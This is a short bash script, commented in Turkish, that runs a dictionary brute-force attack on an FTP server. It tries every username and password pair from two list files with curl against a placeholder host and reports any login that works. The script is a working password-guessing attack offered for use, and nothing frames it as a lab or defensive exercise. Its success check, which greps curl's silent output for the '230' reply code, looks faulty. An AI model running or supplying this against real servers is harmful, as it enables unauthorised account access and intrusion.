#!/bin/bash

# FTP sunucusu, kullanıcı adı listesi ve parola listesi
SERVER="ftp.example.com"
USER_LIST="usernames.txt"
PASS_LIST="passwords.txt"

# Brute force saldırısı
while IFS= read -r USER; do
  while IFS= read -r PASS; do
    echo "Trying $USER:$PASS"
    RESPONSE=$(curl -s --user "$USER:$PASS" "ftp://$SERVER" | grep "230")
    if [ -n "$RESPONSE" ]; then
      echo "Login successful: $USER:$PASS"
      exit 0
    fi
  done < "$PASS_LIST"
done < "$USER_LIST"

echo "Brute force attack finished."
exit 1